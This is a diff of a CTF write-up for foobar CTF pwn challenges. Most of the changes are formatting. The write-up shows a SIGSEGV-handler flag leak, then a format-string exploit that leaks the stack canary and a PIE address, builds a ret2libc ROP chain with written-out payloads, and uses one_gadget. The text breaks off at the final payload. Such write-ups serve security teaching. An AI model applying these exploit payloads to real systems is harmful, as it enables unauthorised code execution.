@@ -14,6 +14,7 @@ Let's run the binary file
 └─$ ./ssid 
 zsh: segmentation fault  ./ssid
 ```
+
 Hmm. Let's check the decompiled binary output:
 ```c
 void entry(undefined8 param_1,undefined8 param_2,undefined8 param_3)
@@ -63,8 +64,8 @@ void FUN_00101300(void)
   exit(1);
 }
 ```
-It seems like we run into segmentation fault because there does not exist flag.txt file  
-Let's try again with flag.txt created
+
+It seems like we run into segmentation fault because there does not exist flag.txt file. Let's try again with flag.txt created
 
 ```console
 ┌──(kali㉿kali)-[~/Desktop/pwn/foobar_ctf/ssid]
@@ -75,10 +76,10 @@ Let's try again with flag.txt created
 test
 test
 ```
-Looks like the program echo back we input
-Another thing to note that the flag.txt file content was stored at ``` DAT_00104020 ```and in the function ``` FUN_00101300 ``` we print out its content  
-Now we want to trigger that function, but how? If we look into the function signal we would find what it's doing is basically using ``` FUN_00101300 ``` to signal-handle a signum : ``` 0xb ``` or the signum for ``` SIGSEV ```    
-Now all we have to do is trigger ``` SIGSEV ``` and ``` FUN_00101300 ``` will give us flag  
+	Looks like the program echo back we input
+	Another thing to note that the flag.txt file content was stored at ``` DAT_00104020 ```and in the function ``` FUN_00101300 ``` we print out its content  
+	Now we want to trigger that function, but how? If we look into the function signal we would find what it's doing is basically using ``` FUN_00101300 ``` to signal-handle a signum : ``` 0xb ``` or the signum for ``` SIGSEV ```    
+	Now all we have to do is trigger ``` SIGSEV ``` and ``` FUN_00101300 ``` will give us flag  
 
 ```c
   __printf_chk(1,acStack56);
@@ -116,6 +117,7 @@ Let's run `checksec` on the file:
     NX:       NX enabled
     PIE:      PIE enabled
 ```
+
 That's a lot of protection. Using ghidra we can decompile the binary:
 
 ```c
@@ -141,16 +143,19 @@ void vuln(void)
   return;
 }
 ```
+
 We can see that there is a format string vulnerability with:
 ```c
   printf(local_98);
 ```
+
 That means we have the ability to read memory and arbitrary write. With that in mind, we can definitely leak the canary value and then buffer-overflow the `local_58` array bypassing the `__stack_chk_fail()`. We can defeat the stack canary  
 
 ```assembly
 0x0000555555555218 <+15>:    mov    rax,QWORD PTR fs:0x28
 0x0000555555555221 <+24>:    mov    QWORD PTR [rbp-0x8],rax
 ```
+
 The canary was stored at `rbp-0x8`
 
 ```
@@ -170,10 +175,14 @@ $1 = (void *) 0x7fffffffdee8
 gef➤  x/gx $rbp -0x8
 0x7fffffffdee8: 0x7636f604229da000
 ```
-Testing a few times, i found out the offset of stack canary was at `"%23$llx"`  
+
+Testing a few times, i found out the offset of stack canary was at `"%23$llx"`
+
 We can then leak the canary and buffer-overflow the return address but where do we return into? Remember that PIE and NX enabled  
-My general attack was to leak `puts libc address` from the `GOT table` and then ret2libc. But in order to do that we need 3 things: `puts@plt` address, `puts@got.plt` address and a `ROP-Gadget` to prepare our `rdi` register before calling into `puts@plt`  
+My general attack was to leak `puts libc address` from the `GOT table` and then ret2libc. But in order to do that we need 3 things: `puts@plt` address, `puts@got.plt` address and a `ROP-Gadget` to prepare our `rdi` register before calling into `puts@plt` 
+
 Because PIE was enabled we need to leak an address in the program and calculate with the offset to figure out those addresses we need. We will take advantage of this:
+	
 ```
 0x7fffffffded0: 0x00005555555552e0      0x00007fffffffdf00
 0x7fffffffdee0: 0x0000555555555120      0x7636f604229da000
@@ -183,15 +192,19 @@ gef➤  x/2i 0x00005555555552e0
    0x5555555552e0 <__libc_csu_init>:    endbr64 
    0x5555555552e4 <__libc_csu_init+4>:  push   r15
 ```
+
 We will leak the address of `__libc_csu_init` with the offset of `"%20$llx"` using format strings vulnerability  
 We then use `ROPgadget` to find `pop rdi, ret`:
+	
 ```console
 ┌──(kali㉿kali)-[~/Desktop/pwn/foobar_ctf]
 └─$ ROPgadget --binary chall | grep "rdi"
 0x000000000000100b : fldcw word ptr [rdi] ; add byte ptr [rax], al ; test rax, rax ; je 0x1016 ; call rax
 0x0000000000001343 : pop rdi ; ret
 ```
+
 We have these offsets to calculate:
+	
 ```
 0x1343 : pop rdi ; ret
 0x12a5 <main+0>:     endbr64
@@ -205,13 +218,17 @@ puts_plt = base_prog + 0x10b0
 main_addr = base_prog + 0x12a5
 pop_rdi = base_prog + 0x1343
 ```
+
 Now we build our payloads:
+
 ```
 first_payload = "%23$llx%20$llx"
 second_payload = "A"*72 + p64(canary) + p64(0x0) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
 ```
+
 With leaked puts libc address we can get the libc of the program using libc-database which was `libc6_2.23-0ubuntu11.2_amd64.so`  
 Then we use `one_gadget`:
+
 ```console
 ┌──(kali㉿kali)-[~/Desktop/pwn/foobar_ctf]
 └─$ one_gadget libc6_2.23-0ubuntu11.2_amd64.so
@@ -219,6 +236,7 @@ Then we use `one_gadget`:
 constraints:
   rax == NULL
 ```
+
 Now we have everything to build our final payload  
 
 ```python
